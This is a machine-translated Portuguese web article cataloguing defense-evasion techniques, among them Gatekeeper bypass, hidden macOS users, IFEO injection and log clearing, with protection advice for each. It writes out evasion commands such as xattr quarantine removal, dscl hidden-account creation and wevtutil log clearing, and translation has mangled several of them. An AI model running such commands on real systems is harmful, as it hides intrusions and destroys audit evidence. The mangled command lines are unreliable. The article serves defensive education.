href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Desativando ferramentas de seguran√ßa</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows, Linux, macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o: Os</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> invasores podem desativar v√°rios recursos de seguran√ßa, destruir processos de log de eventos, chaves do Registro para que as ferramentas de seguran√ßa n√£o sejam iniciadas durante atividades maliciosas ou usar outros m√©todos para interferir na opera√ß√£o de scanners de seguran√ßa ou relat√≥rios de eventos. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> verifique se os direitos de acesso aos processos, registro e arquivos est√£o configurados corretamente para evitar desconex√£o ou interfer√™ncia n√£o autorizada na opera√ß√£o das ferramentas de seguran√ßa.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Explora√ß√£o por evas√£o de defesa</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows, Linux, macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos: </font></font></i><font style="vertical-align: inherit;"></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o do</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> usu√°rio </font><i><font style="vertical-align: inherit;">:</font></i><font style="vertical-align: inherit;"> Como em qualquer software, o software de seguran√ßa pode ter vulnerabilidades que um invasor pode usar para desativ√°-las ou ignor√°-las. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Atualiza√ß√µes regulares de software, desenvolvimento e implementa√ß√£o de um processo de gerenciamento de vulnerabilidades de software. </font><font style="vertical-align: inherit;">O uso de aplicativos de virtualiza√ß√£o e microssegmenta√ß√£o pode reduzir os riscos de uma poss√≠vel explora√ß√£o de vulnerabilidades.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Inje√ß√£o de EWM (inje√ß√£o de mem√≥ria de janela extra)</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Administrador, </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o do</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Sistema </font><i><font style="vertical-align: inherit;">: A</font></i><font style="vertical-align: inherit;"> t√©cnica √© abusar da mem√≥ria adicional da janela do Windows, a chamada Mem√≥ria Extra da Janela (EWM). O tamanho do EWM √© de 40 bytes, adequado para armazenar um ponteiro de 32 bits e geralmente √© usado para indicar uma refer√™ncia aos procedimentos. Programas maliciosos durante a cadeia de ataques podem apontar para c√≥digos maliciosos no EWM, que ser√° iniciado posteriormente pelo processo do aplicativo infectado. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Como as t√©cnicas de inje√ß√£o de EWM s√£o baseadas no abuso das fun√ß√µes de desenvolvimento do sistema operacional, os esfor√ßos de prote√ß√£o devem ser direcionados para impedir o lan√ßamento de programas e ferramentas maliciosas. </font><font style="vertical-align: inherit;">√â uma boa pr√°tica identificar e bloquear softwares potencialmente perigosos usando o AppLocker, aplicativos da lista de permiss√µes ou aplicar Pol√≠ticas de Restri√ß√£o de Software.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exclus√£o de arquivos (exclus√£o de arquivo)</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows, Linux, macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos: </font></font></i><font style="vertical-align: inherit;"></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o do</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> usu√°rio </font><i><font style="vertical-align: inherit;">:</font></i><font style="vertical-align: inherit;"> V√°rias ferramentas, malware e outros arquivos usados ‚Äã‚Äãpelo advers√°rio podem deixar vest√≠gios de atividade de hackers no sistema. Os invasores podem excluir esses arquivos de artefato durante uma invas√£o para reduzir a probabilidade de um ataque ser detectado ou exclu√≠-los no final de sua opera√ß√£o. O advers√°rio pode usar ferramentas especiais para destrui√ß√£o garantida de informa√ß√µes (por exemplo, Windows Sysinternals Sdelete) e ferramentas integradas ao sistema operacional, por exemplo, DEL e ipher. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> se poss√≠vel, bloqueie o lan√ßamento de utilit√°rios de sistema desnecess√°rios, ferramentas de terceiros e software potencialmente perigoso que podem ser usados ‚Äã‚Äãpara destruir arquivos.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Lendo arquivos usando deslocamentos l√≥gicos do sistema de arquivos</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Administrador </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o: O</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows pode permitir que programas acessem diretamente volumes l√≥gicos. </font><font style="vertical-align: inherit;">Programas com acesso direto podem ler e gravar arquivos diretamente no disco r√≠gido, analisar a estrutura de dados do sistema de arquivos. </font><font style="vertical-align: inherit;">Esse m√©todo ignora o controle de acesso a arquivos e o monitoramento do sistema de arquivos. </font><font style="vertical-align: inherit;">Utilit√°rios como o NinjaCopy servem para executar as a√ß√µes acima no PowerShell. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Bloqueando software potencialmente perigoso.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bypass do Porteiro</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Usu√°rio, Administrador </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MacOS e OS X usam a tecnologia Gatekeper, que executa apenas software confi√°vel. Ao baixar um aplicativo da Internet, um atributo especial √© definido no arquivo com.apple.quarantine, que indica que o Gatekeeper deve solicitar ao usu√°rio permiss√£o para executar o arquivo baixado. O sinalizador √© definido antes de salvar o arquivo no disco e, quando o usu√°rio tenta abrir o arquivo, o Gatekeeper verifica o sinalizador correspondente e, se houver, o sistema solicitar√° que o usu√°rio confirme o lan√ßamento e mostre o URL do qual o arquivo foi baixado. Os aplicativos baixados no sistema a partir de uma unidade USB, unidade √≥ptica, infantil ou de rede n√£o far√£o com que o sinalizador seja definido no arquivo com.apple.quarantine. Alguns utilit√°rios e arquivos que entraram no sistema atacado durante a inicializa√ß√£o de sombra (t√©cnica Drive-by-compromise),tamb√©m n√£o faz com que o sinalizador seja definido para o Gatekeeper, ignorando a verifica√ß√£o de proxy. A presen√ßa do sinalizador de quarentena pode ser verificada com o comando:</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xattr /path/to/MyApp.app</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O sinalizador tamb√©m pode ser removido com attr, mas isso exigir√° escala√ß√£o de privil√©gios: </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app </font></font></i> <br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de seguran√ßa:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Al√©m do Gatekeeper, voc√™ deve proibir o in√≠cio de aplicativos que n√£o s√£o baixados do Apple Store.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Vari√°vel HISTCONTROL</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Linux, macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos: </font></font></i><font style="vertical-align: inherit;"></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o do</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> usu√°rio </font><i><font style="vertical-align: inherit;">:</font></i><font style="vertical-align: inherit;"> A vari√°vel de ambiente HISTCONTROL representa uma lista de par√¢metros para salvar o hist√≥rico de comandos no arquivo ~ / .bash_history quando o usu√°rio efetua logoff. Por exemplo, a op√ß√£o ignorespace indica que n√£o √© necess√°rio salvar linhas come√ßando com um espa√ßo, e a op√ß√£o ignororedups desativar√° o salvamento de comandos que s√£o repetidos em uma linha. Em alguns sistemas Linux, a op√ß√£o ignoreboth √© especificada por padr√£o, o que implica a inclus√£o dos dois par√¢metros acima. Isso significa que o comando ls n√£o ser√° salvo no hist√≥rico, ao contr√°rio do ls.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O HISTCONTROL n√£o √© usado por padr√£o no macOS, mas pode ser configurado pelo usu√°rio. </font><font style="vertical-align: inherit;">Os invasores podem usar os recursos dos par√¢metros HISTCONTROL para n√£o deixar vest√≠gios de suas atividades simplesmente inserindo espa√ßos na frente dos comandos. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de seguran√ßa:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Impe√ßa que os usu√°rios alterem a vari√°vel HISTCONTROL e tamb√©m verifique se HISTCONTROL est√° definido como ignoredup e n√£o cont√©m as op√ß√µes ignoreboth e ignorespace.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Arquivos e diret√≥rios ocultos</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows, Linux, macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos: </font></font></i><font style="vertical-align: inherit;"></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o do</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> usu√°rio </font><i><font style="vertical-align: inherit;">:</font></i><font style="vertical-align: inherit;"> No Windows, os usu√°rios podem ocultar arquivos usando o comando attrib. Basta especificar o atributo </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ h &lt;nome do arquivo&gt;</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> para ocultar o arquivo ou "+ s" para marcar o arquivo como sistema. Adicionando o par√¢metro "/ S", o utilit√°rio attrib aplicar√° as altera√ß√µes recursivamente. No Linux / Mac, os usu√°rios podem ocultar arquivos e pastas simplesmente especificando um "." No in√≠cio do nome do arquivo. Depois disso, arquivos e pastas ser√£o ocultados do aplicativo Finder e, por exemplo, do utilit√°rio ls.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">No macOS, os arquivos podem ser sinalizados com UF_HIDDEN, o que desativar√° sua visibilidade no Finder.app, mas n√£o impedir√° que arquivos ocultos sejam vistos no Terminal.app. </font><font style="vertical-align: inherit;">Muitos aplicativos criam arquivos e pastas ocultos para n√£o sobrecarregar a √°rea de trabalho do usu√°rio. </font><font style="vertical-align: inherit;">Por exemplo, os utilit√°rios SSH criam uma pasta .ssh oculta que armazena uma lista de hosts e chaves de usu√°rio conhecidos. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Os invasores podem usar a capacidade de ocultar arquivos e pastas para n√£o atrair a aten√ß√£o dos usu√°rios. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> √â dif√≠cil impedir o uso dessa t√©cnica devido ao fato de ocultar arquivos ser um recurso padr√£o do sistema operacional.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Usu√°rios ocultos</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> administrador, raiz </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> cada conta do macOS possui um ID do usu√°rio que pode ser especificado durante a cria√ß√£o do usu√°rio. As propriedades </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/Library/Preferences/com.apple.loginwindow</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> tem a op√ß√£o </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hide500Users</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , que esconde os IDs de usu√°rio 500 e abaixo para a tela de login. Assim, ao criar um usu√°rio com um identificador &lt;500 e ativar o Hide500Users, um invasor pode ocultar suas contas: </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo dscl. -create / User / nome de usu√°rio O </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">padr√£o </font><font style="vertical-align: inherit;">UniqueID 401 </font><font style="vertical-align: inherit;">sudo grava /Library/Preferences/com.apple.loginwindow Hide500Users -bool TRUE </font></font></i> <br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Se a esta√ß√£o de trabalho estiver em um dom√≠nio, a pol√≠tica de grupo poder√° limitar a capacidade de criar e ocultar usu√°rios. </font><font style="vertical-align: inherit;">Da mesma forma, a capacidade de modificar as propriedades /Library/Preferences/com.apple.loginwindow √© impedida.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows oculto</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos: </font></font></i><font style="vertical-align: inherit;"></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o do</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> usu√°rio </font><i><font style="vertical-align: inherit;">:</font></i><font style="vertical-align: inherit;"> As op√ß√µes de inicializa√ß√£o de aplicativos no macOS e no OS X est√£o listadas nos arquivos plist das propriedades. </font><font style="vertical-align: inherit;">Uma das tags nesses arquivos apple.awt.UIElement inclui ocultar o √≠cone do aplicativo Java no Dock. </font><font style="vertical-align: inherit;">Normalmente, essa tag √© usada para aplicativos em execu√ß√£o na bandeja do sistema, mas os invasores podem abusar desse recurso e ocultar aplicativos maliciosos. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> monitore a lista de programas que possuem a tag apple.awt.UIElement nas propriedades plist.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Inje√ß√£o de IFEO (inje√ß√£o de op√ß√µes de execu√ß√£o de arquivo de imagem)</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Direitos:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Administrador, </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o do</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> sistema </font><i><font style="vertical-align: inherit;">:</font></i><font style="vertical-align: inherit;"> O mecanismo IFEO (Image File Execution Options) permite executar um depurador de programa em vez de um programa especificado anteriormente pelo desenvolvedor no registro:</font></font><br><br><ul><li> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Op√ß√µes de execu√ß√£o de arquivo HKLM \ Software \ Microsoft \ Windows NT \ CurrentVersion \ Image / [execut√°vel]</font></font></i> </li><li> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Op√ß√µes de execu√ß√£o de arquivo de imagem HKLM \ SOFTWARE \ Wow6432Node \ Microsoft \ Windows NT \ CurrentVersion \ Image \ [execut√°vel]</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , em que </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[execut√°vel]</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> √© o bin√°rio execut√°vel do depurador.</font></font></li></ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Como inje√ß√µes, o valor </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[execut√°vel]</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> pode ser abusado ao executar c√≥digo arbitr√°rio para aumentar privil√©gios ou obter uma posi√ß√£o no sistema. Programas maliciosos podem usar o IFEO para ignorar a prote√ß√£o registrando depuradores que redirecionam e rejeitam v√°rios aplicativos de sistema e seguran√ßa. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o: A</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> t√©cnica descrita √© baseada no abuso de ferramentas regulares de desenvolvimento de SO, portanto, qualquer restri√ß√£o pode causar instabilidade de software leg√≠timo, por exemplo, aplicativos de seguran√ßa. Os esfor√ßos para impedir o uso de t√©cnicas de inje√ß√£o de IFEO precisam ser focados nos est√°gios iniciais da cadeia de ataque. Voc√™ pode detectar esse ataque monitorando processos com o processo </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Debug_</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> e</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Debug_only_this_process</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bloqueio de Indicador</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o: Os</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> invasores podem tentar bloquear v√°rios indicadores ou eventos capturados por ferramentas de seguran√ßa para an√°lise posterior. Atividade maliciosa pode incluir a modifica√ß√£o de arquivos de configura√ß√£o de seguran√ßa, chaves do Registro ou redirecionamento malicioso de eventos de telemetria. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ao lidar com ferramentas de an√°lise de atividade de rede, um invasor pode bloquear o tr√°fego associado ao envio de relat√≥rios ao servidor de gerenciamento de seguran√ßa. Isso pode ser feito de v√°rias maneiras, por exemplo, interrompendo o processo local respons√°vel pela transmiss√£o de telemetria, criando uma regra no firewall para bloquear o tr√°fego para os hosts respons√°veis ‚Äã‚Äãpor agregar eventos de seguran√ßa. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Verifique se os rastreadores e remetentes de eventos, pol√≠ticas de firewall e outros mecanismos relacionados est√£o protegidos por permiss√µes e controles de acesso apropriados. </font><font style="vertical-align: inherit;">Considere reiniciar automaticamente o recurso de encaminhamento de eventos de seguran√ßa em intervalos repetidos, bem como a capacidade de aplicar o gerenciamento de altera√ß√µes apropriado √†s regras de firewall e outras configura√ß√µes do sistema.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Removendo indicadores de ferramentas maliciosas (Remo√ß√£o de Indicador de Ferramentas)</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows, Linux, macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Se um aplicativo mal-intencionado estiver em quarentena ou bloqueado, o invasor pode determinar o motivo da detec√ß√£o de sua ferramenta (indicador), alterar a ferramenta removendo o indicador e usar uma vers√£o atualizada do malware que n√£o ser√° detectada por meios de prote√ß√£o. Um bom exemplo √© a detec√ß√£o de malware usando uma soma de verifica√ß√£o ou assinatura de arquivo e colocando-os em quarentena com software antiv√≠rus. Um invasor que determina que um malware foi colocado em quarentena por software antiv√≠rus por causa de sua assinatura / soma de verifica√ß√£o pode usar t√©cnicas de empacotamento de software ou outros m√©todos de modifica√ß√£o de um arquivo para alterar a assinatura ou soma de verifica√ß√£o e reutiliz√°-lo. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O advers√°rio pode ter acesso ao sistema e saber quais m√©todos e ferramentas est√£o bloqueados pela prote√ß√£o residente. Use m√©todos avan√ßados de configura√ß√£o de recursos de seguran√ßa e prote√ß√£o, explore o processo de poss√≠vel comprometimento do sistema protegido para organizar o processo de aviso sobre uma poss√≠vel invas√£o. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Identifique e bloqueie software potencialmente perigoso e mal-intencionado usando ferramentas da lista de permiss√µes, como o AppLocker e pol√≠ticas de restri√ß√£o de software.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A primeira detec√ß√£o de uma ferramenta maliciosa pode acionar um alerta para um sistema antiv√≠rus ou outra ferramenta de seguran√ßa. </font><font style="vertical-align: inherit;">Tais eventos podem ocorrer no per√≠metro e podem ser detectados usando um sistema IDS, verifica√ß√£o de correio etc. </font><font style="vertical-align: inherit;">A detec√ß√£o inicial deve ser considerada como um sinal do in√≠cio da invas√£o, o que requer investiga√ß√£o cuidadosa fora do "local" do evento inicial. </font><font style="vertical-align: inherit;">Os invasores podem continuar o ataque, assumindo que determinados eventos de software antiv√≠rus n√£o ser√£o investigados ou que o analista n√£o poder√° associar permanentemente o evento registrado a outras atividades que ocorrem na rede.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Removendo indicadores do host (Remo√ß√£o de Indicador no Host)</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sistema:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows, Linux, macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o: Os</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> invasores podem excluir ou modificar artefatos gerados no sistema atacado, incluindo logs e arquivos interceptados em quarentena. A localiza√ß√£o e o formato dos logs podem variar dependendo do SO, os logs do sistema s√£o registrados como arquivos do Windows Event ou Linux / macOS, como /.bash_history e .var / log / *. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A√ß√µes direcionadas que interferem na opera√ß√£o de coleta de eventos e mecanismos de aviso que podem ser usados ‚Äã‚Äãpara detectar invas√µes podem comprometer as ferramentas de seguran√ßa, como resultado dos quais os eventos de seguran√ßa n√£o ser√£o analisados. Tais a√ß√µes podem complicar o processo de exame e resposta devido √† falta de dados sobre a incurs√£o.</font></font><br><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Como limpar os logs de eventos do Windows Os logs de eventos do</font></font></b> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows s√£o um registro de alertas e notifica√ß√µes e opera√ß√£o do sistema. A Microsoft define o evento como "qualquer evento significativo em um sistema ou programa que exija notifica√ß√£o aos usu√°rios ou log". Existem tr√™s fontes de eventos do sistema: sistema, aplicativos e seguran√ßa. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Opositores que executam a√ß√µes relacionadas ao gerenciamento de contas, efetuando login em uma conta, acesso a servi√ßos de diret√≥rio etc. pode limpar o log de eventos para ocultar suas a√ß√µes. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Os logs de eventos podem ser limpos com os seguintes utilit√°rios do console: </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wevtutil cl system; </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aplica√ß√£o cl wevtutil; </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">seguran√ßa wevtutil cl.</font></font></i> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Os logs tamb√©m podem ser limpos usando outras ferramentas, como o PowerShell.</font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recomenda√ß√µes de prote√ß√£o:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> use armazenamento centralizado de logs de eventos para que n√£o seja poss√≠vel exibir e gerenciar logs de eventos na m√°quina local. </font><font style="vertical-align: inherit;">Se poss√≠vel, minimize o atraso no relat√≥rio de eventos para evitar o armazenamento de log de longo prazo no sistema local. </font><font style="vertical-align: inherit;">Proteja os arquivos de log de eventos armazenados localmente com permiss√µes 